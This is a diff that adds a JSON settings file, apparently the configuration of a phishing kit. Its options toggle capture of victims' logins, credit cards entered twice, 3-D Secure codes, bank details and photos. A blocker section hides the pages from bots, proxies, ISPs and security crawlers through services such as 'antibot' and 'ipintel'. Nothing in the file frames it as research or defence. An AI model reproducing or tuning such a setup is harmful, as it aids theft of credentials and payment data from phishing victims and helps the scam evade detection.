@@ -1,0 +1,37 @@
+{
+    "lc": {
+        "lock_lang": "0",
+        "default_lang": "en",
+        "lock_country": "0",
+        "allow_country": "AF"
+    },
+    "sp": {
+        "param": "plms",
+        "case": "locked",
+        "one_time": "1",
+        "send_login": "1",
+        "double_cc": "0",
+        "3dsecure": "0",
+        "email_login": "0",
+        "photo": "0",
+        "bank": "0"
+    },
+    "blocker": {
+        "host": "1",
+        "agent": "1",
+        "ip": "1",
+        "isp": "1",
+        "dinamic": "0",
+
+        "proxy": "1",
+	    "iphunter": "1",
+        "teoh": "1",
+        "ipintel": "1",
+        "iprisk": "1"
+    },
+    
+    "apikey": {
+        "antibot": "",
+        "ipstack": ""
+    }
+}
